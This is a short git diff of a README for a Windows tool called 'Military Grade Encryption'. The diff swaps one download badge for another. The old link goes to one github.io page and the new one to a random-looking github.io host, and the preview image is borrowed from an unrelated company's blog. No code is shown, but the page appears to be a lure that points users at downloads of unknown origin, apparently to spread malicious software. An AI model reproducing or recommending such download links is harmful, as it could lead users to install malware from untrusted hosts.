@@ -5,13 +5,7 @@
 
 <h1 align="center">🔐 Military Grade Encryption (Windows)</h1>
 
-<p align="center">
-  <a href="https://military-grade-encryption-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Military%20Grade%20Encryption-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download Military Grade Encryption for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://vesperasgwendazqqwpd.github.io/.github/military-grade-encryption)
 
 <p align="center">
   <img src="https://ironcorelabs.com/images/blog/military-grade-encryption-social.jpg" alt="Military Grade Encryption UI preview" width="700" />
